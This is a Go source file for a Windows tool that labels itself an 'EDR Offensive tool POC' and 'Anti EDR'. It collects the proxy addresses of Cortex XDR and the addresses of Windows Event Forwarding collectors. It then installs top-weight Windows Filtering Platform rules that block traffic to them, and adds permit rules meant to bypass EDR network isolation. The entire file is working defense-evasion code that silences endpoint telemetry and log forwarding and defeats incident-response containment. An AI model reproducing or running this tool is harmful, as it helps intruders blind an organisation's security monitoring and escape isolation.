package main

import (
	"bufio"
	"encoding/json"
	"flag"
	"fmt"
	"io/ioutil"
	"log"
	"net"
	"net/netip"
	"os"
	"regexp"
	"strconv"
	"strings"

	"golang.org/x/sys/windows"
	"golang.org/x/sys/windows/registry"
	"inet.af/wf"
)

type Config struct {
	Provider struct {
		Provider_name string `json:"provider_name"`
		Provider_ID   string `json:"provider_ID"`
	} `json:"provider"`
	Sublayer struct {
		Sublayer_name string `json:"sublayer_name"`
		Sublayer_ID   string `json:"sublayer_ID"`
	} `json:"sublayer"`
	Block_port string              `json:"Block_port"`
	Block      []map[string]string `json:"Block"`
}
type BlockIP struct {
	Entry netip.Addr
}

func extractHostAndPort(input string) (string, string) {
	regex := regexp.MustCompile(`//([^:/]+):(\d+)`)
	matches := regex.FindStringSubmatch(input)
	if len(matches) >= 3 {
		return matches[1], matches[2]
	}
	return "", ""
}

func resolveIPAddress(host string) (string, error) {
	addrs, err := net.LookupHost(host)
	if err != nil {
		return "", err
	}
	if len(addrs) >= 1 {
		return addrs[0], nil
	}
	return "", fmt.Errorf("[!]No IP address found for host: %s", host)
}

func cortex_read(outputFile *os.File) {

	var TableproxyIP []string
	var Cortexport string
	var outputjson string

	CortexConfigFile := `C:\ProgramData\Cyvera\LocalSystem\Data\db_backup\cloud_defined_proxy.txt`
	content, err := ioutil.ReadFile(CortexConfigFile)
	if err != nil {
		log.Fatal(err)
	}
	// Convert file content to string
	fileContent := string(content)

	// Split the content into lines
	lines := strings.Split(fileContent, "\n")
	for _, line := range lines {
		// Split the line by comma
		values := strings.Split(line, ",")

		// Print the values
		for _, value := range values {
			value := strings.Replace(value, ";", "", -1) // remove end of line ; char
			subvalues := strings.Split(value, ":")
			numentries := len(subvalues)
			if numentries < 2 {
				log.Panic("Error Splitting port from IP in cloud_defined_proxy.txt file")
			}
			TableproxyIP = append(TableproxyIP, subvalues[0])
			Cortexport = subvalues[1]
			fmt.Printf("IP = %s Port = %s\n", subvalues[0], subvalues[1])
		}
	}
	outputjson = outputjson + "{\n"
	outputjson = outputjson + "\t\"Provider\": {\n"
	outputjson = outputjson + "\t\t\"Provider_name\": \"WFP_EDR\",\n"
	outputjson = outputjson + "\t\t\"Provider_ID\": \"{12345678-AAAA-BBBB-CCCC-123456789012}\"\n"
	outputjson = outputjson + "\t},\n"
	outputjson = outputjson + "\t\"Sublayer\": {\n"
	outputjson = outputjson + "\t\t\"Sublayer_name\" : \"WFP_EDR_WEC\",\n"
	outputjson = outputjson + "\t\t\"Sublayer_ID\" : \"{12345678-AAAA-BBBB-CCCC-123456789012}\"\n"
	outputjson = outputjson + "\t},\n"
	outputjson = outputjson + "\t\"Block_port\": \"" + Cortexport + "\",\n"
	outputjson = outputjson + "\t\"Block\": [\n"
	for i, wec := range TableproxyIP {
		if i < len(TableproxyIP)-1 {
			outputjson = outputjson + "\t\t{\"CortexProxy" + strconv.Itoa(i) + "\": \"" + wec + "\"},\n"
		} else {
			outputjson = outputjson + "\t\t{\"CortexProxy" + strconv.Itoa(i) + "\": \"" + wec + "\"}\n"
			outputjson = outputjson + "\t]\n"
		}
	}
	outputjson = outputjson + "}\n"

	fmt.Print("\n\n")
	if outputFile != nil {
		fileInfo, _ := outputFile.Stat()
		if fileInfo.Size() > 0 {
			log.Panic("[!] Output file already exists. Exiting !")
			os.Exit(1)
		}
		_, err := outputFile.WriteString(outputjson)
		if err != nil {
			fmt.Println("[!] Error writing to outputFile:", err)
			return
		} else {
			fmt.Println("JSON content written to file : ", outputFile.Name())
			fmt.Print("\n\n")
		}
	} else {
		fmt.Println("=========================================== XDR.json config example ===============================")

	}
	fmt.Print(outputjson)

}

func wec_read(outputFile *os.File) {
	var TableWECIP []string
	var WECPort string
	var outputjson string

	keyPath := `SOFTWARE\Policies\Microsoft\Windows\EventLog\EventForwarding\SubscriptionManager`

	key, err := registry.OpenKey(registry.LOCAL_MACHINE, keyPath, registry.READ)
	if err != nil {
		fmt.Printf("[!] Failed to open registry key: %v\n", err)
		return
	} else {
		fmt.Println("[+] Registry key is present")
	}
	defer key.Close()
	ReturnedValues, err := key.ReadValueNames(0)
	if err != nil {
		fmt.Printf("[!] Failed to read registry values: %v\n", err)
		return
	}
	if len(ReturnedValues) == 0 {
		fmt.Println("[!] Found Registry key but no WEC forwarding values !")
		return
	} else {
		for _, WEC_Value := range ReturnedValues {
			fmt.Println("[+] Found WEC entry ")
			Value, _, _ := key.GetStringValue(WEC_Value)
			fmt.Println("\n\t" + Value)
			host, port := extractHostAndPort(Value)
			ip, err := resolveIPAddress(host)
			if err != nil {
				fmt.Printf("[!] Failed to resolve IP address: %v\n", err)
				return
			}
			fmt.Println("\tHost:", host)
			fmt.Println("\tPort:", port)
			WECPort = port
			fmt.Println("\tIP Address:", ip)
			TableWECIP = append(TableWECIP, ip) // add all IPs to table

		}
		fmt.Println("=========================================== WEC.json config example ===============================")
		outputjson = outputjson + "{\n"
		outputjson = outputjson + "\t\"Provider\": {\n"
		outputjson = outputjson + "\t\t\"Provider_name\": \"WFP_EDR\",\n"
		outputjson = outputjson + "\t\t\"Provider_ID\": \"{12345678-AAAA-BBBB-CCCC-123456789012}\"\n"
		outputjson = outputjson + "\t},\n"
		outputjson = outputjson + "\t\"Sublayer\": {\n"
		outputjson = outputjson + "\t\t\"Sublayer_name\" : \"WFP_EDR_WEC\",\n"
		outputjson = outputjson + "\t\t\"Sublayer_ID\" : \"{12345678-AAAA-BBBB-CCCC-123456789012}\"\n"
		outputjson = outputjson + "\t},\n"
		outputjson = outputjson + "\t\"Block_port\": \"" + WECPort + "\",\n"
		outputjson = outputjson + "\t\"Block\": [\n"
		for _, wec := range TableWECIP {
			outputjson = outputjson + "\t\t{\"WEC\": \"" + wec + "\"}\n"
			outputjson = outputjson + "\t]\n"
		}
		outputjson = outputjson + "}\n"
		fmt.Print("\n\n")
		if outputFile != nil {
			fileInfo, _ := outputFile.Stat()
			if fileInfo.Size() > 0 {
				log.Panic("[!] Output file already exists. Exiting !")
				os.Exit(1)
			}
			_, err := outputFile.WriteString(outputjson)
			if err != nil {
				fmt.Println("[!] Error writing to outputFile:", err)
				return
			} else {
				fmt.Println("JSON content written to file : ", outputFile.Name())
				fmt.Print("\n\n")
			}
		} else {
			fmt.Println("=========================================== WEC.json config example ===============================")

		}
		fmt.Print(outputjson)
	}
	key.Close()
}
func read() {
	session, err := wf.New(&wf.Options{
		Name:    "EDR Offensive tool POC with WFP",
		Dynamic: true,
	})
	if err != nil {
		fmt.Println("[!] Error creating new WFP session !\n\nAre you sure to be running with privileges ?")
		log.Fatal(err)
	}

	fmt.Println("[+] Created new Session name = 'EDR Offensive tool POC WITH wfp'")
	ReadProvider, err := session.Providers()
	if err != nil {
		panic(err)
	}
	fmt.Println("")
	fmt.Printf("| %-38s | %-55s | %-80s\n", "ProviderID", "ProviderName", "Description")
	fmt.Println("--------------------------------------------------------------------------------------------------------")
	for _, FoundProvider := range ReadProvider {
		fmt.Printf("| %-38s | %-55s | %-80s\n", FoundProvider.ID.String(), FoundProvider.Name, FoundProvider.Description)
	}
	fmt.Println("")
	Readsublayer, err := session.Sublayers()
	if err != nil {
		panic(err)
	}
	fmt.Printf("| %-38s | %-38s | %-60s | %-10s | %-4s\n", "ProviderID", "SubLayerID", "SublayerName", "Weight", "Persistent")
	fmt.Println("--------------------------------------------------------------------------------------------------------")
	for _, FoundSubLayer := range Readsublayer {
		fmt.Printf("| %-38s | %-38s | %-60s | %-10d | %-10t\n", FoundSubLayer.Provider, FoundSubLayer.ID.String(), FoundSubLayer.Name, FoundSubLayer.Weight, FoundSubLayer.Persistent)
	}
}

func install(configFile string) {
	// Check if the config file path is provided as an argument

	// Get the config file path from command-line arguments
	// Read the JSON file
	data, err := ioutil.ReadFile(configFile)
	if err != nil {
		log.Fatal(err)
	}
	fmt.Printf("[+] Starting Anti EDR with WFP filters\n")

	// Unmarshal the JSON data into a Config struct
	var config Config
	err = json.Unmarshal(data, &config)
	if err != nil {
		log.Fatal("[!] Error processing your config file\n", err)
	} else {
		fmt.Printf("[+] Config file parsed\n")
	}

	session, err := wf.New(&wf.Options{
		Name:    "EDR Offensive tool POC with WFP",
		Dynamic: true,
	})
	if err != nil {
		fmt.Println("[!] Error creating new WFP session !\n\nAre you sure to be running with privileges ?")
		log.Fatal(err)
	}

	fmt.Println("[+] Created new Session name = 'EDR Offensive tool POC with WFP'")

	//guidprovider, _ := windows.GenerateGUID()
	guidprovider, _ := windows.GUIDFromString(config.Provider.Provider_ID)
	providerID := wf.ProviderID(guidprovider)
	err = session.AddProvider(&wf.Provider{
		ID:         providerID,
		Name:       config.Provider.Provider_name,
		Persistent: false,
	})
	if err != nil {
		fmt.Println(err)
		fmt.Println("[!]  Provider ID already exists !!! Failed creation of new Provider ! not an issue, let's continue ...")
		fmt.Println("")
	} else {
		fmt.Println("[+] Adding Provider name = '", config.Provider.Provider_name, "' providerID = ", guidprovider, " Persistent = false")
	}

	fmt.Println("[+] Adding sublayer ID = '", config.Sublayer.Sublayer_ID, "'")

	guid, _ := windows.GUIDFromString(config.Sublayer.Sublayer_ID)
	sublayerID := wf.SublayerID(guid)
	err = session.AddSublayer(&wf.Sublayer{
		ID:       sublayerID,
		Name:     config.Sublayer.Sublayer_name,
		Provider: providerID,
		Weight:   0xffff, // the highest possible weight

	})
	if err != nil {
		fmt.Println(err)
		fmt.Println("[!] SubLayer ID already exists !!! not an issue, let's continue ...")
		fmt.Println("")
	} else {
		fmt.Println("[+] Adding sublayer guid = ", guid, " name = ", config.Sublayer.Sublayer_name, " Isolation weight 0xffff")
	}
	layers := []wf.LayerID{
		//wf.LayerALEAuthRecvAcceptV4,
		//wf.LayerALEAuthConnectV4,
		wf.LayerALEAuthConnectV4,
		//wf.LayerOutboundTransportV4,

	}
	var TableBlockIP []BlockIP

	for _, entry := range config.Block {
		for region, ip := range entry {
			fmt.Printf("  [+] Name: %s, IP: %s\n", region, ip)
			MyIP, err := netip.ParseAddr(ip)
			if err != nil {
				fmt.Println("[!] Error converting to an IP addresse : ", ip)
				panic(err)
			}
			NewEntry := BlockIP{MyIP}
			TableBlockIP = append(TableBlockIP, NewEntry)
		}
	}

	Block_port, err := strconv.ParseUint(config.Block_port, 10, 16)
	fmt.Printf("  [+] Block_port: %s\n", config.Block_port)
	if err != nil {
		fmt.Println("Error:", err)
		return
	}
	for _, layer := range layers {
		guid, _ := windows.GenerateGUID()
		fmt.Println("[+] Adding WFP rule to block EDR flow guid = ", guid, " name = 'EDR_BLOCKING_RULE' for layer = ", layer)
		conds := []*wf.Match{
			{
				Field: wf.FieldIPRemotePort,
				Op:    wf.MatchTypeEqual,
				Value: uint16(Block_port), // adding filter port 443
			},
			{
				Field: wf.FieldIPProtocol,
				Op:    wf.MatchTypeEqual,
				Value: wf.IPProtoTCP, // adding filter type = TCP
			},
		}
		for _, entry := range TableBlockIP {
			conds = append(conds, &wf.Match{
				Field: wf.FieldIPRemoteAddress,
				Op:    wf.MatchTypeEqual,
				Value: entry.Entry, // adding each IP address as RemoteAddress
			})
		}
		err = session.AddRule(&wf.Rule{
			ID:         wf.RuleID(guid),
			Name:       "EDR_BLOCKING_RULE",
			Layer:      layer,
			Sublayer:   sublayerID,
			Provider:   providerID,
			Persistent: false, // no need to keep rule if process exits.
			HardAction: true,  //rule cannot be overriden except by a Veto
			Action:     wf.ActionBlock,
			Weight:     1000,
			Conditions: conds,
		})
		if err != nil {
			log.Print("ERROR: ", err)
		}
	}

	// bypassing the Isolation in case of
	isolationlayers := []wf.LayerID{
		wf.LayerALEAuthRecvAcceptV4,
		wf.LayerALEAuthConnectV4,
		wf.LayerOutboundTransportV4,
	}

	for _, layer := range isolationlayers {
		guid, _ := windows.GenerateGUID()
		fmt.Println("[+] adding WFP rule to Allow rule to bypass ISOLATION guid = ", guid, " name = 'EDR_Isolate_bypass_RULE' for layer = ", layer)
		err = session.AddRule(&wf.Rule{
			ID:         wf.RuleID(guid),
			Name:       "EDR_Isolate_bypass_RULE",
			Layer:      layer,
			Sublayer:   sublayerID,
			Provider:   providerID,
			Persistent: false, // no need to keep rule for next reboot
			HardAction: true,  //rule cannot be overriden except by a Veto
			Action:     wf.ActionPermit,
			Weight:     999,
			Conditions: []*wf.Match{
				{
					Field: wf.FieldIPProtocol,
					Op:    wf.MatchTypeEqual,
					Value: wf.IPProtoTCP,
				},
				{
					Field: wf.FieldIPProtocol,
					Op:    wf.MatchTypeEqual,
					Value: wf.IPProtoICMP,
				},
				{
					Field: wf.FieldIPProtocol,
					Op:    wf.MatchTypeEqual,
					Value: wf.IPProtoUDP,
				},
			},
		})
		if err != nil {
			log.Print("[!] ERROR: ", err)
		}
	}

	isolationICMPlayers := []wf.LayerID{
		wf.LayerOutboundICMPErrorV4,
		wf.LayerInboundICMPErrorV4,
	}

	for _, layer := range isolationICMPlayers {
		guid, _ := windows.GenerateGUID()
		fmt.Println("[+] Adding WFP rule to Allow ANY ICMPv4 guid = ", guid, " name = 'EDR_Isolate_bypass_ICMP_RULE' for layer = ", layer)
		err = session.AddRule(&wf.Rule{
			ID:         wf.RuleID(guid),
			Name:       "EDR_Isolate_bypass_ICMP_RULE",
			Layer:      layer,
			Sublayer:   sublayerID,
			Provider:   providerID,
			Persistent: false, // no need to keep rule for next reboot
			HardAction: true,  //rule cannot be overriden except by a Veto
			Action:     wf.ActionPermit,
			Weight:     999,
		})
		if err != nil {
			log.Print("[!] ERROR: ", err)
		}
	}

	fmt.Println("==> Press ENTER to finish and remove tempory WFP rules...")
	reader := bufio.NewReader(os.Stdin)
	_, _ = reader.ReadString('\n')
	fmt.Println("[+] Finished")

}

func main() {
	if len(os.Args) < 2 {
		fmt.Println("Usage: ", os.Args[0], "-help : for more help")
		os.Exit(1)
	}
	printFlag := flag.Bool("print", false, "Print WFP Providers and SubLayers")
	installFlag := flag.Bool("install", false, "Install WFP rules (requires the file option)")
	fileFlag := flag.String("file", "", "Specify a json file path")
	getwecflag := flag.Bool("getwec", false, "Get WEC Config and generate a WFP config")
	getcortexflag := flag.Bool("getcortex", false, "Get Cortex XDR proxy config and generate a WFP config")
	outputFlag := flag.String("output", "", "Specify output file. To be used in conjonction with generating with getwec or getcortex")
	flag.Parse()

	// Let's print Provider IDs and SubLayer IDs
	if *printFlag {
		read()
		os.Exit(0)
	}

	if *installFlag {
		if *fileFlag != "" {
			install(*fileFlag)
		} else {
			log.Fatal("-install option requires -file value")
		}
	}

	if *getwecflag {
		fmt.Println("Let's get WEC config from registry...")
		if *outputFlag != "" {
			outputfile, err := os.OpenFile(*outputFlag, os.O_WRONLY|os.O_CREATE, 0644)
			if err != nil {
				fmt.Println("Error creating output file\n", err)
				os.Exit(1)
			}
			defer outputfile.Close()
			wec_read(outputfile)
			os.Exit(0)
		} else {
			wec_read(nil)
			os.Exit(0)

		}

	}
	if *getcortexflag {
		fmt.Println("Let's get Cortex XDR Proxy config...")
		if *outputFlag != "" {
			outputfile, err := os.OpenFile(*outputFlag, os.O_WRONLY|os.O_CREATE, 0644)
			if err != nil {
				fmt.Println("Error creating output file\n", err)
				os.Exit(1)
			}
			defer outputfile.Close()
			cortex_read(outputfile)
			os.Exit(0)
		} else {
			cortex_read(nil)
			os.Exit(0)

		}
	}
}
